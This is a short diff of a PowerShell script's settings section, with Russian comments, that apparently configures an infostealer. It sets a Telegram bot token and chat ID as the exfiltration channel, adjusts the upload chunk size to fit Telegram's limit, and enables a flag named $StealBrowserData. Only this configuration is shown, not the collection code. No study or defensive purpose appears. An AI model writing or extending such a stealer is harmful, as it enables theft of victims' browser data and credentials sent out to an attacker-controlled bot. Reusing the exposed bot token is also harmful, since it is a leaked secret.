@@ -1,7 +1,7 @@
 # --- Настройки Telegram ---
 $BotToken = '8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I'
 $YourChatId = '1266539824'
-$MaxPartSize = 50MB  # лимит Telegram
+$MaxPartSize = 49MB  # лимит Telegram
 
 # --- Настройки сбора данных ---
 $StealBrowserData      = $true
